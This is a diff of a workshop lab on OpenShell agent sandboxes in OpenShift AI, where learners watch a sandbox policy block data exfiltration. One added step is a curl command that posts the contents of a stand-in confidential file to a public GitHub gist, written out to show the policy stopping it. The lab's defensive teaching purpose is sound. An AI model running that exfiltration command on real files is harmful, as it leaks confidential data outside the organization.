@@ -7,11 +7,13 @@
 
 Guardrails protect the model. Sandboxes protect everything else.
 
-{company_name} has a confidential document - `internal-policies.pdf` - containing underwriting policies that should never leave the organization: DTI limits more conservative than the QM safe harbor, jumbo loan thresholds, rate lock windows, and the exception approval chain. An AI coding agent with file system access and network connectivity could read this document and send it anywhere. OpenShell prevents that.
+{company_name} keeps its underwriting policies in a document that should never leave the organization: DTI limits more conservative than the QM safe harbor, jumbo loan thresholds, rate lock windows, and the exception approval chain. An AI coding agent with file system access and network connectivity could read that document and send it anywhere. OpenShell prevents that.
+
+You will stand in for it with a file you create yourself inside the sandbox, so nothing real is ever at risk.
 
 Estimated time: *10 minutes*
 
-NOTE: OpenShell is Dev Preview in RHOAI 3.5, Tech Preview in 3.6, with GA targeted early next year. What you see here represents the direction of secure agent onboarding on OpenShift AI.
+NOTE: OpenShell is Dev Preview in RHOAI 3.5 and Tech Preview in 3.6, with GA targeted for a later release. What you see here represents the direction of secure agent onboarding on OpenShift AI.
 
 == Exercise 1: See the Sandbox in OpenShift
 
@@ -81,7 +83,7 @@ WARNING: Do not try to clear a stuck `connect` with `openshell sandbox stop`. A 
 +
 TIP: `openshell sandbox connect <name> --editor vscode` launches a remote editor against the sandbox instead of a shell, installing the SSH config it needs on first use.
 
-. Create the document the rest of this section will try to steal. Treating it as customer data makes the point without shipping a real file:
+. Create the stand-in document the rest of this section will try to steal. Treating it as confidential makes the point without shipping a real file:
 +
 [source,bash]
 ----
@@ -156,19 +158,21 @@ WARNING: The lesson is not "the upload failed". It is that the only thing standi
 
 == Exercise 4: Enforce Policy to Block Exfiltration
 
-Now close it again. From the *workbench terminal*, apply the standard policy you fetched in exercise 3:
+Now close it again.
 
+. From the *workbench terminal*, apply the standard policy you fetched in exercise 3:
++
 [source,bash]
 ----
 openshell policy set --policy policy.yaml --wait --timeout 120 fedaura-opencode
 ----
-
++
 [source,text]
 ----
 ✓ Policy version 4 submitted (hash: b69d4123e8c3)
 ✓ Policy version 4 loaded (active version: 4)
 ----
-
++
 The sandbox was never restarted and the agent inside it kept running. Policy is hot-loaded.
 
 . Inside the sandbox, repeat the *read*:
@@ -185,11 +189,12 @@ curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
 +
 Still allowed. The agent can research on GitHub, which is most of what a coding agent legitimately needs it for.
 
-. Repeat the *write* - the exact command from exercise 3:
+. Repeat the *write* - the same request as exercise 3, with `-o /dev/null` dropped so you can read the response body instead of just its status:
 +
 [source,bash]
 ----
-curl -s -X POST https://api.github.com/gists -d '{"public":true}'
+curl -s -X POST https://api.github.com/gists \
+  -d "{\"public\":true,\"files\":{\"leak.txt\":{\"content\":\"$(cat /sandbox/internal-policies.txt)\"}}}"
 ----
 +
 [source,json]
@@ -320,9 +325,9 @@ IMPORTANT: One filesystem rule to know about. A live policy update cannot *remov
 * Reviewed guardrail traces in MLflow with detection methods and evidence
 * Explored Garak adversarial test results showing pre-deployment robustness testing
 * Connected to an OpenShell Agent Sandbox and saw the agent's isolated runtime environment
-* Attempted data exfiltration and observed it succeeding without policy enforcement
-* Applied policy to block exfiltration and saw the deny-by-default model in action
-* Experimented with custom policy rules using the Policy Advisor workflow
+* Attempted data exfiltration with egress open and saw that nothing in the platform stopped the request leaving - only GitHub's own authentication did
+* Applied policy to block exfiltration and saw the deny-by-default model in action, denied at `layer: l7` before the request left the sandbox
+* Experimented with custom policy rules, using each denial's `rule_missing` field to drive an audit2allow-style loop
 
 === Key Takeaways
 
